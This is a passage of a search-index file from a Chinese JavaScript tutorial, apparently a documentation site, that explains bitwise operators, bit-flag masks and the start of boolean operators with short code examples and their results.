\u5229\u7528\u8fd9\u4e2a\u7279\u6027\uff0c\u53ef\u4ee5\u5199\u51fa\u4e00\u4e2a\u51fd\u6570\uff0c\u5c06\u4efb\u610f\u6570\u503c\u8f6c\u4e3a32\u4f4d\u6574\u6570\u3002 1 2 3 function toInt32 ( x ) { return x | 0 ; } \u4e0a\u9762\u8fd9\u4e2a\u51fd\u6570\u5c06\u4efb\u610f\u503c\u4e0e 0 \u8fdb\u884c\u4e00\u6b21\u6216\u8fd0\u7b97\uff0c\u8fd9\u4e2a\u4f4d\u8fd0\u7b97\u4f1a\u81ea\u52a8\u5c06\u4e00\u4e2a\u503c\u8f6c\u4e3a32\u4f4d\u6574\u6570\u3002\u4e0b\u9762\u662f\u8fd9\u4e2a\u51fd\u6570\u7684\u7528\u6cd5\u3002 1 2 3 4 5 6 toInt32 ( 1.001 ) // 1 toInt32 ( 1.999 ) // 1 toInt32 ( 1 ) // 1 toInt32 ( - 1 ) // -1 toInt32 ( Math . pow ( 2 , 32 ) + 1 ) // 1 toInt32 ( Math . pow ( 2 , 32 ) - 1 ) // -1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c toInt32 \u53ef\u4ee5\u5c06\u5c0f\u6570\u8f6c\u4e3a\u6574\u6570\u3002\u5bf9\u4e8e\u4e00\u822c\u7684\u6574\u6570\uff0c\u8fd4\u56de\u503c\u4e0d\u4f1a\u6709\u4efb\u4f55\u53d8\u5316\u3002\u5bf9\u4e8e\u5927\u4e8e\u6216\u7b49\u4e8e2\u768432\u6b21\u65b9\u7684\u6574\u6570\uff0c\u5927\u4e8e32\u4f4d\u7684\u6570\u4f4d\u90fd\u4f1a\u88ab\u820d\u53bb\u3002","title":"\u6982\u8ff0"},{"location":"operators/bit/#_3","text":"\u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\u7b26\uff08 | \uff09\u9010\u4f4d\u6bd4\u8f83\u4e24\u4e2a\u8fd0\u7b97\u5b50\uff0c\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u4e4b\u4e2d\u53ea\u8981\u6709\u4e00\u4e2a\u4e3a 1 \uff0c\u5c31\u8fd4\u56de 1 \uff0c\u5426\u5219\u8fd4\u56de 0 \u3002 1 0 | 3 // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 0 \u548c 3 \u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u5206\u522b\u662f 00 \u548c 11 \uff0c\u6240\u4ee5\u8fdb\u884c\u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\u4f1a\u5f97\u5230 11 \uff08\u5373 3 \uff09\u3002 \u4f4d\u8fd0\u7b97\u53ea\u5bf9\u6574\u6570\u6709\u6548\uff0c\u9047\u5230\u5c0f\u6570\u65f6\uff0c\u4f1a\u5c06\u5c0f\u6570\u90e8\u5206\u820d\u53bb\uff0c\u53ea\u4fdd\u7559\u6574\u6570\u90e8\u5206\u3002\u6240\u4ee5\uff0c\u5c06\u4e00\u4e2a\u5c0f\u6570\u4e0e 0 \u8fdb\u884c\u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\uff0c\u7b49\u540c\u4e8e\u5bf9\u8be5\u6570\u53bb\u9664\u5c0f\u6570\u90e8\u5206\uff0c\u5373\u53d6\u6574\u6570\u4f4d\u3002 1 2 2.9 | 0 // 2 - 2.9 | 0 // -2 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u79cd\u53d6\u6574\u65b9\u6cd5\u4e0d\u9002\u7528\u8d85\u8fc732\u4f4d\u6574\u6570\u6700\u5927\u503c 2147483647 \u7684\u6570\u3002 1 2 2147483649.4 | 0 ; // -2147483647","title":"\u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\u7b26"},{"location":"operators/bit/#_4","text":"\u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\u7b26\uff08 & \uff09\u7684\u89c4\u5219\u662f\u9010\u4f4d\u6bd4\u8f83\u4e24\u4e2a\u8fd0\u7b97\u5b50\uff0c\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u4e4b\u4e2d\u53ea\u8981\u6709\u4e00\u4e2a\u4f4d\u4e3a 0 \uff0c\u5c31\u8fd4\u56de 0 \uff0c\u5426\u5219\u8fd4\u56de 1 \u3002 1 0 & 3 // 0 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c0\uff08\u4e8c\u8fdb\u5236 00 \uff09\u548c3\uff08\u4e8c\u8fdb\u5236 11 \uff09\u8fdb\u884c\u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\u4f1a\u5f97\u5230 00 \uff08\u5373 0 \uff09\u3002","title":"\u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\u7b26"},{"location":"operators/bit/#_5","text":"\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u7b26\uff08 ~ \uff09\u5c06\u6bcf\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u90fd\u53d8\u4e3a\u76f8\u53cd\u503c\uff08 0 \u53d8\u4e3a 1 \uff0c 1 \u53d8\u4e3a 0 \uff09\u3002\u5b83\u7684\u8fd4\u56de\u7ed3\u679c\u6709\u65f6\u6bd4\u8f83\u96be\u7406\u89e3\uff0c\u56e0\u4e3a\u6d89\u53ca\u5230\u8ba1\u7b97\u673a\u5185\u90e8\u7684\u6570\u503c\u8868\u793a\u673a\u5236\u3002 1 ~ 3 // -4 \u4e0a\u9762\u8868\u8fbe\u5f0f\u5bf9 3 \u8fdb\u884c\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\uff0c\u5f97\u5230 -4 \u3002\u4e4b\u6240\u4ee5\u4f1a\u6709\u8fd9\u6837\u7684\u7ed3\u679c\uff0c\u662f\u56e0\u4e3a\u4f4d\u8fd0\u7b97\u65f6\uff0cJavaScript \u5185\u90e8\u5c06\u6240\u6709\u7684\u8fd0\u7b97\u5b50\u90fd\u8f6c\u4e3a32\u4f4d\u7684\u4e8c\u8fdb\u5236\u6574\u6570\u518d\u8fdb\u884c\u8fd0\u7b97\u3002 3 \u768432\u4f4d\u6574\u6570\u5f62\u5f0f\u662f 00000000000000000000000000000011 \uff0c\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u4ee5\u540e\u5f97\u5230 11111111111111111111111111111100 \u3002\u7531\u4e8e\u7b2c\u4e00\u4f4d\uff08\u7b26\u53f7\u4f4d\uff09\u662f1\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6570\u662f\u4e00\u4e2a\u8d1f\u6570\u3002JavaScript \u5185\u90e8\u91c7\u7528\u8865\u7801\u5f62\u5f0f\u8868\u793a\u8d1f\u6570\uff0c\u5373\u9700\u8981\u5c06\u8fd9\u4e2a\u6570\u51cf\u53bb1\uff0c\u518d\u53d6\u4e00\u6b21\u53cd\uff0c\u7136\u540e\u52a0\u4e0a\u8d1f\u53f7\uff0c\u624d\u80fd\u5f97\u5230\u8fd9\u4e2a\u8d1f\u6570\u5bf9\u5e94\u768410\u8fdb\u5236\u503c\u3002\u8fd9\u4e2a\u6570\u51cf\u53bb1\u7b49\u4e8e 11111111111111111111111111111011 \uff0c\u518d\u53d6\u4e00\u6b21\u53cd\u5f97\u5230 00000000000000000000000000000100 \uff0c\u518d\u52a0\u4e0a\u8d1f\u53f7\u5c31\u662f -4 \u3002\u8003\u8651\u5230\u8fd9\u6837\u7684\u8fc7\u7a0b\u6bd4\u8f83\u9ebb\u70e6\uff0c\u53ef\u4ee5\u7b80\u5355\u8bb0\u5fc6\u6210\uff0c\u4e00\u4e2a\u6570\u4e0e\u81ea\u8eab\u7684\u53d6\u53cd\u503c\u76f8\u52a0\uff0c\u7b49\u4e8e-1\u3002 1 ~ - 3 // 2 \u4e0a\u9762\u8868\u8fbe\u5f0f\u53ef\u4ee5\u8fd9\u6837\u7b97\uff0c -3 \u7684\u53d6\u53cd\u503c\u7b49\u4e8e -1 \u51cf\u53bb -3 \uff0c\u7ed3\u679c\u4e3a 2 \u3002 \u5bf9\u4e00\u4e2a\u6574\u6570\u8fde\u7eed\u4e24\u6b21\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\uff0c\u5f97\u5230\u5b83\u81ea\u8eab\u3002 1 ~~ 3 // 3 \u6240\u6709\u7684\u4f4d\u8fd0\u7b97\u90fd\u53ea\u5bf9\u6574\u6570\u6709\u6548\u3002\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u9047\u5230\u5c0f\u6570\u65f6\uff0c\u4e5f\u4f1a\u5c06\u5c0f\u6570\u90e8\u5206\u820d\u53bb\uff0c\u53ea\u4fdd\u7559\u6574\u6570\u90e8\u5206\u3002\u6240\u4ee5\uff0c\u5bf9\u4e00\u4e2a\u5c0f\u6570\u8fde\u7eed\u8fdb\u884c\u4e24\u6b21\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\uff0c\u80fd\u8fbe\u5230\u53d6\u6574\u6548\u679c\u3002 1 2 3 4 ~~ 2.9 // 2 ~~ 47.11 // 47 ~~ 1.9999 // 1 ~~ 3 // 3 \u4f7f\u7528\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u53d6\u6574\uff0c\u662f\u6240\u6709\u53d6\u6574\u65b9\u6cd5\u4e2d\u6700\u5feb\u7684\u4e00\u79cd\u3002 \u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\uff0cJavaScript \u5f15\u64ce\u4f1a\u5148\u8c03\u7528 Number \u51fd\u6570\uff0c\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u76f8\u5f53\u4e8e~Number('011') ~ '011' // -12 // \u76f8\u5f53\u4e8e~Number('42 cats') ~ '42 cats' // -1 // \u76f8\u5f53\u4e8e~Number('0xcafebabe') ~ '0xcafebabe' // 889275713 // \u76f8\u5f53\u4e8e~Number('deadbeef') ~ 'deadbeef' // -1 Number \u51fd\u6570\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u503c\u7684\u89c4\u5219\uff0c\u53c2\u89c1\u300a\u6570\u636e\u7684\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 \u5bf9\u4e8e\u5176\u4ed6\u7c7b\u578b\u7684\u503c\uff0c\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u4e5f\u662f\u5148\u7528 Number \u8f6c\u4e3a\u6570\u503c\uff0c\u7136\u540e\u518d\u8fdb\u884c\u5904\u7406\u3002 1 2 3 4 5 6 7 8 // \u76f8\u5f53\u4e8e ~Number([]) ~ [] // -1 // \u76f8\u5f53\u4e8e ~Number(NaN) ~ NaN // -1 // \u76f8\u5f53\u4e8e ~Number(null) ~ null // -1","title":"\u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u7b26"},{"location":"operators/bit/#_6","text":"\u5f02\u6216\u8fd0\u7b97\uff08 ^ \uff09\u5728\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u4e0d\u540c\u65f6\u8fd4\u56de 1 \uff0c\u76f8\u540c\u65f6\u8fd4\u56de 0 \u3002 1 0 ^ 3 // 3 \u4e0a\u9762\u8868\u8fbe\u5f0f\u4e2d\uff0c 0 \uff08\u4e8c\u8fdb\u5236 00 \uff09\u4e0e 3 \uff08\u4e8c\u8fdb\u5236 11 \uff09\u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\uff0c\u5b83\u4eec\u6bcf\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u90fd\u4e0d\u540c\uff0c\u6240\u4ee5\u5f97\u5230 11 \uff08\u5373 3 \uff09\u3002 \u201c\u5f02\u6216\u8fd0\u7b97\u201d\u6709\u4e00\u4e2a\u7279\u6b8a\u8fd0\u7528\uff0c\u8fde\u7eed\u5bf9\u4e24\u4e2a\u6570 a \u548c b \u8fdb\u884c\u4e09\u6b21\u5f02\u6216\u8fd0\u7b97\uff0c a^=b; b^=a; a^=b; \uff0c\u53ef\u4ee5 \u4e92\u6362 \u5b83\u4eec\u7684\u503c\u3002\u8fd9\u610f\u5473\u7740\uff0c\u4f7f\u7528\u201c\u5f02\u6216\u8fd0\u7b97\u201d\u53ef\u4ee5\u5728\u4e0d\u5f15\u5165\u4e34\u65f6\u53d8\u91cf\u7684\u524d\u63d0\u4e0b\uff0c\u4e92\u6362\u4e24\u4e2a\u53d8\u91cf\u7684\u503c\u3002 1 2 3 4 5 6 7 var a = 10 ; var b = 99 ; a ^= b , b ^= a , a ^= b ; a // 99 b // 10 \u8fd9\u662f\u4e92\u6362\u4e24\u4e2a\u53d8\u91cf\u7684\u503c\u7684\u6700\u5feb\u65b9\u6cd5\u3002 \u5f02\u6216\u8fd0\u7b97\u4e5f\u53ef\u4ee5\u7528\u6765\u53d6\u6574\u3002 1 12.9 ^ 0 // 12","title":"\u5f02\u6216\u8fd0\u7b97\u7b26"},{"location":"operators/bit/#_7","text":"\u5de6\u79fb\u8fd0\u7b97\u7b26\uff08 << \uff09\u8868\u793a\u5c06\u4e00\u4e2a\u6570\u7684\u4e8c\u8fdb\u5236\u503c\u5411\u5de6\u79fb\u52a8\u6307\u5b9a\u7684\u4f4d\u6570\uff0c\u5c3e\u90e8\u8865 0 \uff0c\u5373\u4e58\u4ee5 2 \u7684\u6307\u5b9a\u6b21\u65b9\u3002\u5411\u5de6\u79fb\u52a8\u7684\u65f6\u5019\uff0c\u6700\u9ad8\u4f4d\u7684\u7b26\u53f7\u4f4d\u662f\u4e00\u8d77\u79fb\u52a8\u7684\u3002 1 2 3 4 5 6 7 8 // 4 \u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u4e3a100\uff0c // \u5de6\u79fb\u4e00\u4f4d\u4e3a1000\uff08\u5373\u5341\u8fdb\u5236\u76848\uff09 // \u76f8\u5f53\u4e8e\u4e58\u4ee52\u76841\u6b21\u65b9 4 << 1 // 8 - 4 << 1 // -8 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c -4 \u5de6\u79fb\u4e00\u4f4d\u5f97\u5230 -8 \uff0c\u662f\u56e0\u4e3a -4 \u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u662f 11111111111111111111111111111100 \uff0c\u5de6\u79fb\u4e00\u4f4d\u540e\u5f97\u5230 11111111111111111111111111111000 \uff0c\u8be5\u6570\u8f6c\u4e3a\u5341\u8fdb\u5236\uff08\u51cf\u53bb1\u540e\u53d6\u53cd\uff0c\u518d\u52a0\u4e0a\u8d1f\u53f7\uff09\u5373\u4e3a -8 \u3002 \u5982\u679c\u5de6\u79fb0\u4f4d\uff0c\u5c31\u76f8\u5f53\u4e8e\u5c06\u8be5\u6570\u503c\u8f6c\u4e3a32\u4f4d\u6574\u6570\uff0c\u7b49\u540c\u4e8e\u53d6\u6574\uff0c\u5bf9\u4e8e\u6b63\u6570\u548c\u8d1f\u6570\u90fd\u6709\u6548\u3002 1 2 3 4 5 13.5 << 0 // 13 - 13.5 << 0 // -13 \u5de6\u79fb\u8fd0\u7b97\u7b26\u7528\u4e8e\u4e8c\u8fdb\u5236\u6570\u503c\u975e\u5e38\u65b9\u4fbf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var color = { r : 186 , g : 218 , b : 85 }; // RGB to HEX // (1 << 24)\u7684\u4f5c\u7528\u4e3a\u4fdd\u8bc1\u7ed3\u679c\u662f6\u4f4d\u6570 var rgb2hex = function ( r , g , b ) { return '#' + (( 1 << 24 ) + ( r << 16 ) + ( g << 8 ) + b ) . toString ( 16 ) // \u5148\u8f6c\u6210\u5341\u516d\u8fdb\u5236\uff0c\u7136\u540e\u8fd4\u56de\u5b57\u7b26\u4e32 . substr ( 1 ); // \u53bb\u9664\u5b57\u7b26\u4e32\u7684\u6700\u9ad8\u4f4d\uff0c\u8fd4\u56de\u540e\u9762\u516d\u4e2a\u5b57\u7b26\u4e32 } rgb2hex ( color . r , color . g , color . b ) // \"#bada55\" \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528\u5de6\u79fb\u8fd0\u7b97\u7b26\uff0c\u5c06\u989c\u8272\u7684 RGB \u503c\u8f6c\u4e3a HEX \u503c\u3002","title":"\u5de6\u79fb\u8fd0\u7b97\u7b26"},{"location":"operators/bit/#_8","text":"\u53f3\u79fb\u8fd0\u7b97\u7b26\uff08 >> \uff09\u8868\u793a\u5c06\u4e00\u4e2a\u6570\u7684\u4e8c\u8fdb\u5236\u503c\u5411\u53f3\u79fb\u52a8\u6307\u5b9a\u7684\u4f4d\u6570\u3002\u5982\u679c\u662f\u6b63\u6570\uff0c\u5934\u90e8\u5168\u90e8\u8865 0 \uff1b\u5982\u679c\u662f\u8d1f\u6570\uff0c\u5934\u90e8\u5168\u90e8\u8865 1 \u3002\u53f3\u79fb\u8fd0\u7b97\u7b26\u57fa\u672c\u4e0a\u76f8\u5f53\u4e8e\u9664\u4ee5 2 \u7684\u6307\u5b9a\u6b21\u65b9\uff08\u6700\u9ad8\u4f4d\u5373\u7b26\u53f7\u4f4d\u53c2\u4e0e\u79fb\u52a8\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 4 >> 1 // 2 /* // \u56e0\u4e3a4\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u4e3a 00000000000000000000000000000100\uff0c // \u53f3\u79fb\u4e00\u4f4d\u5f97\u5230 00000000000000000000000000000010\uff0c // \u5373\u4e3a\u5341\u8fdb\u5236\u76842 */ - 4 >> 1 // -2 /* // \u56e0\u4e3a-4\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u4e3a 11111111111111111111111111111100\uff0c // \u53f3\u79fb\u4e00\u4f4d\uff0c\u5934\u90e8\u88651\uff0c\u5f97\u5230 11111111111111111111111111111110, // \u5373\u4e3a\u5341\u8fdb\u5236\u7684-2 */ \u53f3\u79fb\u8fd0\u7b97\u53ef\u4ee5\u6a21\u62df 2 \u7684\u6574\u9664\u8fd0\u7b97\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 5 >> 1 // 2 // \u76f8\u5f53\u4e8e 5 / 2 = 2 21 >> 2 // 5 // \u76f8\u5f53\u4e8e 21 / 4 = 5 21 >> 3 // 2 // \u76f8\u5f53\u4e8e 21 / 8 = 2 21 >> 4 // 1 // \u76f8\u5f53\u4e8e 21 / 16 = 1","title":"\u53f3\u79fb\u8fd0\u7b97\u7b26"},{"location":"operators/bit/#_9","text":"\u5934\u90e8\u8865\u96f6\u7684\u53f3\u79fb\u8fd0\u7b97\u7b26\uff08 >>> \uff09\u4e0e\u53f3\u79fb\u8fd0\u7b97\u7b26\uff08 >> \uff09\u53ea\u6709\u4e00\u4e2a\u5dee\u522b\uff0c\u5c31\u662f\u4e00\u4e2a\u6570\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u5411\u53f3\u79fb\u52a8\u65f6\uff0c\u5934\u90e8\u4e00\u5f8b\u8865\u96f6\uff0c\u800c\u4e0d\u8003\u8651\u7b26\u53f7\u4f4d\u3002\u6240\u4ee5\uff0c\u8be5\u8fd0\u7b97\u603b\u662f\u5f97\u5230\u6b63\u503c\u3002\u5bf9\u4e8e\u6b63\u6570\uff0c\u8be5\u8fd0\u7b97\u7684\u7ed3\u679c\u4e0e\u53f3\u79fb\u8fd0\u7b97\u7b26\uff08 >> \uff09\u5b8c\u5168\u4e00\u81f4\uff0c\u533a\u522b\u4e3b\u8981\u5728\u4e8e\u8d1f\u6570\u3002 1 2 3 4 5 6 7 8 9 10 4 >>> 1 // 2 - 4 >>> 1 // 2147483646 /* // \u56e0\u4e3a-4\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\u4e3a11111111111111111111111111111100\uff0c // \u5e26\u7b26\u53f7\u4f4d\u7684\u53f3\u79fb\u4e00\u4f4d\uff0c\u5f97\u523001111111111111111111111111111110\uff0c // \u5373\u4e3a\u5341\u8fdb\u5236\u76842147483646\u3002 */ \u8fd9\u4e2a\u8fd0\u7b97\u5b9e\u9645\u4e0a\u5c06\u4e00\u4e2a\u503c\u8f6c\u4e3a32\u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002 \u67e5\u770b\u4e00\u4e2a\u8d1f\u6574\u6570\u5728\u8ba1\u7b97\u673a\u5185\u90e8\u7684\u50a8\u5b58\u5f62\u5f0f\uff0c\u6700\u5feb\u7684\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528\u8fd9\u4e2a\u8fd0\u7b97\u7b26\u3002 1 - 1 >>> 0 // 4294967295 \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c -1 \u4f5c\u4e3a32\u4f4d\u6574\u6570\u65f6\uff0c\u5185\u90e8\u7684\u50a8\u5b58\u5f62\u5f0f\u4f7f\u7528\u65e0\u7b26\u53f7\u6574\u6570\u683c\u5f0f\u89e3\u8bfb\uff0c\u503c\u4e3a 4294967295\uff08\u5373 (2^32)-1 \uff0c\u7b49\u4e8e 11111111111111111111111111111111 \uff09\u3002","title":"\u5934\u90e8\u8865\u96f6\u7684\u53f3\u79fb\u8fd0\u7b97\u7b26"},{"location":"operators/bit/#_10","text":"\u4f4d\u8fd0\u7b97\u7b26\u53ef\u4ee5\u7528\u4f5c\u8bbe\u7f6e\u5bf9\u8c61\u5c5e\u6027\u7684\u5f00\u5173\u3002 \u5047\u5b9a\u67d0\u4e2a\u5bf9\u8c61\u6709\u56db\u4e2a\u5f00\u5173\uff0c\u6bcf\u4e2a\u5f00\u5173\u90fd\u662f\u4e00\u4e2a\u53d8\u91cf\u3002\u90a3\u4e48\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e2a\u56db\u4f4d\u7684\u4e8c\u8fdb\u5236\u6570\uff0c\u5b83\u7684\u6bcf\u4e2a\u4f4d\u5bf9\u5e94\u4e00\u4e2a\u5f00\u5173\u3002 1 2 3 4 var FLAG_A = 1 ; // 0001 var FLAG_B = 2 ; // 0010 var FLAG_C = 4 ; // 0100 var FLAG_D = 8 ; // 1000 \u4e0a\u9762\u4ee3\u7801\u8bbe\u7f6e A\u3001B\u3001C\u3001D \u56db\u4e2a\u5f00\u5173\uff0c\u6bcf\u4e2a\u5f00\u5173\u5206\u522b\u5360\u6709\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u3002 \u7136\u540e\uff0c\u5c31\u53ef\u4ee5\u7528\u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\uff0c\u68c0\u67e5\u5f53\u524d\u8bbe\u7f6e\u662f\u5426\u6253\u5f00\u4e86\u6307\u5b9a\u5f00\u5173\u3002 1 2 3 4 5 6 var flags = 5 ; // \u4e8c\u8fdb\u5236\u76840101 if ( flags & FLAG_C ) { // ... } // 0101 & 0100 => 0100 => true \u4e0a\u9762\u4ee3\u7801\u68c0\u9a8c\u662f\u5426\u6253\u5f00\u4e86\u5f00\u5173 C \u3002\u5982\u679c\u6253\u5f00\uff0c\u4f1a\u8fd4\u56de true \uff0c\u5426\u5219\u8fd4\u56de false \u3002 \u73b0\u5728\u5047\u8bbe\u9700\u8981\u6253\u5f00 A \u3001 B \u3001 D \u4e09\u4e2a\u5f00\u5173\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u63a9\u7801\u53d8\u91cf\u3002 1 2 var mask = FLAG_A | FLAG_B | FLAG_D ; // 0001 | 0010 | 1000 => 1011 \u4e0a\u9762\u4ee3\u7801\u5bf9 A \u3001 B \u3001 D \u4e09\u4e2a\u53d8\u91cf\u8fdb\u884c\u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\uff0c\u5f97\u5230\u63a9\u7801\u503c\u4e3a\u4e8c\u8fdb\u5236\u7684 1011 \u3002 \u6709\u4e86\u63a9\u7801\uff0c\u4e8c\u8fdb\u5236\u6216\u8fd0\u7b97\u53ef\u4ee5\u786e\u4fdd\u6253\u5f00\u6307\u5b9a\u7684\u5f00\u5173\u3002 1 flags = flags | mask ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8ba1\u7b97\u540e\u5f97\u5230\u7684 flags \u53d8\u91cf\uff0c\u4ee3\u8868\u4e09\u4e2a\u5f00\u5173\u7684\u4e8c\u8fdb\u5236\u4f4d\u90fd\u6253\u5f00\u4e86\u3002 \u4e8c\u8fdb\u5236\u4e0e\u8fd0\u7b97\u53ef\u4ee5\u5c06\u5f53\u524d\u8bbe\u7f6e\u4e2d\u51e1\u662f\u4e0e\u5f00\u5173\u8bbe\u7f6e\u4e0d\u4e00\u6837\u7684\u9879\uff0c\u5168\u90e8\u5173\u95ed\u3002 1 flags = flags & mask ; \u5f02\u6216\u8fd0\u7b97\u53ef\u4ee5\u5207\u6362\uff08toggle\uff09\u5f53\u524d\u8bbe\u7f6e\uff0c\u5373\u7b2c\u4e00\u6b21\u6267\u884c\u53ef\u4ee5\u5f97\u5230\u5f53\u524d\u8bbe\u7f6e\u7684\u76f8\u53cd\u503c\uff0c\u518d\u6267\u884c\u4e00\u6b21\u53c8\u5f97\u5230\u539f\u6765\u7684\u503c\u3002 1 flags = flags ^ mask ; \u4e8c\u8fdb\u5236\u5426\u8fd0\u7b97\u53ef\u4ee5\u7ffb\u8f6c\u5f53\u524d\u8bbe\u7f6e\uff0c\u5373\u539f\u8bbe\u7f6e\u4e3a 0 \uff0c\u8fd0\u7b97\u540e\u53d8\u4e3a 1 \uff1b\u539f\u8bbe\u7f6e\u4e3a 1 \uff0c\u8fd0\u7b97\u540e\u53d8\u4e3a 0 \u3002 1 flags = ~ flags ;","title":"\u5f00\u5173\u4f5c\u7528"},{"location":"operators/bit/#_11","text":"Michal Budzynski, JavaScript: The less known parts. Bitwise Operators Axel Rauschmayer, Basic JavaScript for the impatient programmer Mozilla Developer Network, Bitwise Operators","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"operators/boolean/","text":"\u5e03\u5c14\u8fd0\u7b97\u7b26 \u00b6 \u6982\u8ff0 \u00b6 \u5e03\u5c14\u8fd0\u7b97\u7b26\u7528\u4e8e\u5c06\u8868\u8fbe\u5f0f\u8f6c\u4e3a\u5e03\u5c14\u503c\uff0c\u4e00\u5171\u5305\u542b\u56db\u4e2a\u8fd0\u7b97\u7b26\u3002 \u53d6\u53cd\u8fd0\u7b97\u7b26\uff1a ! \u4e14\u8fd0\u7b97\u7b26\uff1a && \u6216\u8fd0\u7b97\u7b26\uff1a || \u4e09\u5143\u8fd0\u7b97\u7b26\uff1a ?: \u53d6\u53cd\u8fd0\u7b97\u7b26\uff08!\uff09 \u00b6 \u53d6\u53cd\u8fd0\u7b97\u7b26\u662f\u4e00\u4e2a\u611f\u53f9\u53f7\uff0c\u7528\u4e8e\u5c06\u5e03\u5c14\u503c\u53d8\u4e3a\u76f8\u53cd\u503c\uff0c\u5373 true \u53d8\u6210 false \uff0c false \u53d8\u6210 true \u3002 1 2 ! true // false ! false // true \u5bf9\u4e8e\u975e\u5e03\u5c14\u503c\uff0c\u53d6\u53cd\u8fd0\u7b97\u7b26\u4f1a\u5c06\u5176\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002\u53ef\u4ee5\u8fd9\u6837\u8bb0\u5fc6\uff0c\u4ee5\u4e0b\u516d\u4e2a\u503c\u53d6\u53cd\u540e\u4e3a true \uff0c\u5176\u4ed6\u503c\u90fd\u4e3a false \u3002 undefined null false 0 NaN \u7a7a\u5b57\u7b26\u4e32\uff08 '' \uff09 1 2 3 4 5 6 7 8 9 10 ! undefined // true ! null // true ! 0 // true ! NaN // true ! \"\" // true ! 54 // false ! 'hello' // false ! [] // false ! {} // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e0d\u7ba1\u4ec0\u4e48\u7c7b\u578b\u7684\u503c\uff0c\u7ecf\u8fc7\u53d6\u53cd\u8fd0\u7b97\u540e\uff0c\u90fd\u53d8\u6210\u4e86\u5e03\u5c14\u503c\u3002 \u5982\u679c\u5bf9\u4e00\u4e2a\u503c\u8fde\u7eed\u505a\u4e24\u6b21\u53d6\u53cd\u8fd0\u7b97\uff0c\u7b49\u4e8e\u5c06\u5176\u8f6c\u4e3a\u5bf9\u5e94\u7684\u5e03\u5c14\u503c\uff0c\u4e0e Boolean \u51fd\u6570\u7684\u4f5c\u7528\u76f8\u540c\u3002\u8fd9\u662f\u4e00\u79cd\u5e38\u7528\u7684\u7c7b\u578b\u8f6c\u6362\u7684\u5199\u6cd5\u3002 1 2 3 !! x // \u7b49\u540c\u4e8e Boolean ( x ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e0d\u7ba1 x \u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u503c\uff0c\u7ecf\u8fc7\u4e24\u6b21\u53d6\u53cd\u8fd0\u7b97\u540e\uff0c\u53d8\u6210\u4e86\u4e0e Boolean \u51fd\u6570\u7ed3\u679c\u76f8\u540c\u7684\u5e03\u5c14\u503c\u3002\u6240\u4ee5\uff0c\u4e24\u6b21\u53d6\u53cd\u5c31\u662f\u5c06\u4e00\u4e2a\u503c\u8f6c\u4e3a\u5e03\u5c14\u503c\u7684\u7b80\u4fbf\u5199\u6cd5\u3002 \u4e14\u8fd0\u7b97\u7b26\uff08&&\uff09 \u00b6 \u4e14\u8fd0\u7b97\u7b26\uff08 && \uff09\u5f80\u5f80\u7528\u4e8e\u591a\u4e2a\u8868\u8fbe\u5f0f\u7684\u6c42\u503c\u3002 \u5b83\u7684\u8fd0\u7b97\u89c4\u5219\u662f\uff1a\u5982\u679c\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u5e03\u5c14\u503c\u4e3a true 